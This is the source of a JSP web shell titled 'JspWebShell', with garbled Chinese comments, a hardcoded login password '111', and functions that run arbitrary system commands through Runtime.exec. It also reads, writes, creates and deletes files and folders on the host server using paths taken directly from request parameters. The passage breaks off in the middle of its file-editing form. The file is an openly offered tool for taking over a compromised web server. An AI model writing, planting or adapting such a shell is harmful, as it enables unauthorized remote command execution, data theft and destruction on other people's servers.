   <%@ page contentType="text/html; charset=GBK" language="java"
   import="java.sql.*,java.io.File,java.io.*,
   java.nio.charset.Charset,java.io.IOException" errorPage="" %>
   <%

    String path="";//Â·¾¶
    String selfName="";//µÃµ½µ±Ç°µÄURL£¬Ö÷ÒªÓÃÓÚ³¬Á´½ÓµÄURLµÄ¹¹Ôì
   %>
   <%  selfName=request.getRequestURI();
        // String editfile="";
           String editfile=request.getParameter("editfile");
     if (editfile!=null)
     {editfile=new String(editfile.getBytes("ISO8859_1"));
     }
      path=request.getParameter("path");
     if(path==null)
     path=config.getServletContext().getRealPath("/");
   %>
   <%!    String _password ="111";//ÃÜÂëÐÞ¸Ä´¦
   public String HTMLEncode(String str) {
    str = str.replaceAll(" ", " ");
    str = str.replaceAll("<", "<");
    str = str.replaceAll(">", ">");
    str = str.replaceAll("\r
   ", "<br>");

    return str;
   }
       public String exeCmd(String cmd) {
    Runtime runtime = Runtime.getRuntime();
    Process proc = null;
    String retStr = "";
    InputStreamReader insReader = null;
    char[] tmpBuffer = new char[1024];
    int nRet = 0;

    try {
     proc = runtime.exec(cmd);
     insReader = new InputStreamReader(proc.getInputStream(), Charset.forName("GB2312"));
     while ((nRet = insReader.read(tmpBuffer, 0, 1024)) != -1) {
      retStr += new String(tmpBuffer, 0, nRet);
     }

     insReader.close();
     retStr = HTMLEncode(retStr);
    } catch (Exception e) {
     retStr = "<font color=\"red\">ÃüÁî´íÎó\"" + cmd + "\"";
    } finally {
     return retStr;
    }
    }
    public String readAllFile(String filePathName) throws IOException //¶ÁÈ¡ÎÄ¼þ
    {
    FileReader fr = new FileReader(filePathName);
    int count = fr.read();
    String res="";
    while(count != -1)
    {
    //System.out.print((char)count);
     res=res+(char)count;
    count = fr.read();
    if(count == 13)
    {
    fr.skip(1);
    }
    }
    fr.close();
    return res;
    }
   public void writeFile(String filePathName,String args) throws IOException //ÎÄ¼þµÄÐ´Èë
   {
   FileWriter fw = new FileWriter(filePathName);
   PrintWriter out=new PrintWriter(fw);
   out.write(args);
   out.println();
   out.flush();
   fw.close();
   out.close();
   }
   public boolean createFile(String filePathName) throws IOException //´´½¨ÎÄ¼þ
   {
   boolean result = false;
   File file = new File(filePathName);
   if(file.exists())
   {
   System.out.println("ÎÄ¼þÒÑ¾´æÔÚ£¡");
   }
   else
   {
   file.createNewFile();
   result = true;
   System.out.println("ÎÄ¼þÒÑ¾´´½¨£¡");
   }
   return result;
   }
   public boolean createFolder(String fileFolderName) //´´½¨Ä¿Â¼
   {
   boolean result = false;
   try
   {
   File file = new File(fileFolderName);
   if(file.exists())
   {
   //file.delete();
   System.out.println("Ä¿Â¼ÒÑ¾´æÔÚ!");
   result = true;
   }
   else
   {
   file.mkdir();
   System.out.println("Ä¿Â¼ÒÑ¾½¨Á¢!");
   result = true;
   }
   }
   catch(Exception ex)
   {
   result = false;
   System.out.println("CreateAndDeleteFolder is error:"+ex);
   }
   return result;
   }

   public boolean DeleteFolder(String filefolderName)
   {
   boolean result = false;
   try
   {
   File file = new File(filefolderName);
   if(file.exists())
   {
   file.delete();
   System.out.println("Ä¿Â¼ÒÑÉ¾³ý!");
   result = true;
   }
   }
   catch(Exception ex)
   {
   result = false;
   System.out.println("CreateAndDeleteFolder is error:"+ex);
   }
   return result;
   }
   public boolean validate(String password) {
    if (password.equals(_password)) {
     return true;
    } else {
     return false;
    }
   }
   %>

   <html>
   <head>
   <meta http-equiv="Content-Type" content="text/html; charset=gb2312">
   <title>JspWebShell By ¾ø¶ÔÁã¶È[B.C.T]</title>
   <style>
   body {
    font-size: 12px;
    font-family: "ËÎÌå";
    background-color: #666666;
   }
   A {
    COLOR: black; TEXT-DECORATION: none
   }
   A:hover {
    COLOR: black; TEXT-DECORATION: underline; none:
   }
   td {
    font-size: 12px;
    font-family: "ËÎÌå";
    color: #000000;
   }

   input.textbox {
    border: black solid 1;
    font-size: 12px;
    height: 18px;
   }

   input.button {
    font-size: 12px;
    font-family: "ËÎÌå";
    border: black solid 1;
   }

   td.datarows {
    font-size: 12px;
    font-family: "ËÎÌå";
    height: 25px;
    color: #000000;
   }

   textarea {
   border: black solid 1;
   }
   .inputLogin {font-size: 9pt;border:1px solid lightgrey;background-color: lightgrey;}
   .table1 {BORDER:gray 0px ridge;}
   .td2 {BORDER-RIGHT:#ffffff 0px solid;BORDER-TOP:#ffffff 1px solid;BORDER-LEFT:#ffffff 1px solid;BORDER-BOTTOM:#ffffff 0px solid;BACKGROUND-COLOR:lightgrey; height:18px;}
   .tr1 {BACKGROUND-color:gray }
   </style>
   </head>
   <body><body bgcolor="#666666">
    <%
   //session.setMaxInactiveInterval(_sessionOutTime * 60);
   String password=request.getParameter("password");
   if (password == null && session.getAttribute("password") == null) {
   //ÏÔÊ¾µÇÂ½´°¿Ú
   %>

   <div align="center" style="position:absolute;width:100%;visibility:show; z-index:0;left:4px;top:281px">
     <TABLE class="table1" cellSpacing="1" cellPadding="1" width="473" border="0" align="center">
       <tr>
         <td class="tr1"> <TABLE cellSpacing="0" cellPadding="0" width="468" border="0">
             <tr>
               <TD align="left" bgcolor="#333333"><FONT face="webdings" color="#ffffff"> 8</FONT><FONT face="Verdana, Arial, Helvetica, sans-serif" color="#ffffff"><b>JspWebShell
                 version 1.0¹ÜÀíµÇÂ¼ :::...</b></font></TD>
               <TD align="right" bgcolor="#333333"><FONT color="#d2d8ec">Power By
                 </FONT></TD>
             </tr>
             <form name="bctform" method="post">
               <tr bgcolor="#999999">
                 <td height="30" colspan="2" align="center" class="td2">
                   <input name="password" type="password" class="textbox" id="Textbox" />
                   <input type="submit" name="Button" value="Login" id="Button" title="Click here to login" class="button" />
                 </td>
               </tr>
             </form>
           </TABLE></td>
       </tr>
     </TABLE>
   </div>
   <%//ÏÔÊ¾µÇÂ½´°¿Ú½áÊø
     //ÉèÖÃSESSION  ÏÔÊ¾Ö÷Ò³Ãæ
    } else {

    if (session.getAttribute("password") == null) {

     if (validate(password) == false) {
      out.println("<div align=\"center\"><font color=\"red\"><li>ÃÜÂë´íÎó</font></div>");
      out.close();
      return;
     }

     session.setAttribute("password", password);
    } else {
     password = (String)session.getAttribute("password");
    }
   %>
    <%//É¾³ý//ÏÔÊ¾Ö÷µ¥Ôª
     File tmpFile = null;
     String delfile="";
     String delfile1="";
     String editpath="";
     delfile1=request.getParameter("delfile");
     editpath=request.getParameter("filepath");
     if (delfile1!=null)
     {delfile=new String(delfile1.getBytes("ISO8859_1"));
     }
           if ( delfile1!= null) {
           //  out.print(delfile);
         tmpFile = new File(delfile);
     if (! tmpFile.delete()) {
      out.print( "<font color=\"red\">É¾³ýÊ§°Ü</font><br>
   ");
      }
      }
   %>
     <%String editfilecontent=null;//±£´æÎÄ¼þ
          String editfilecontent1=request.getParameter("content");
       // out.println(editfilecontent1);
     //String save=request.getParameter("save");
       if (editfilecontent1!=null)
       {editfilecontent=new String(editfilecontent1.getBytes("ISO8859_1"));}
             //   out.print(editfile);
      //out.print(editfilecontent);
               if (editfile!=null&editfilecontent!=null)
      {try {writeFile(editfile,editfilecontent);}
       catch (Exception e) {out.print("Ð´ÈëÊ§°Ü");}
       out.print("Ð´Èë³É¹¦");
      }
      %>
   <%request.setCharacterEncoding("GBK");%>
   <%//String editfile=request.getParameter("editfile");
   //out.print(editfile);
   if (editfile!=null)//if edit
   {
   %>
   <div id="Layer1" style="position:absolute; left:11px; top:330px; width:757px; height:250px; z-index:1">
     <table width="99%" height="232" border="1">
       <tr>
         <td height="226"><form name="form2" method="post" action="">
             <p align="center"> µØÖ·£º
               <input name="editfile" type="text" value="<%=editfile%>" size="50">
             </p>
             <p align="center">
               <textarea name="content" cols="105" rows="30"><%=readAllFile(editfile)%>
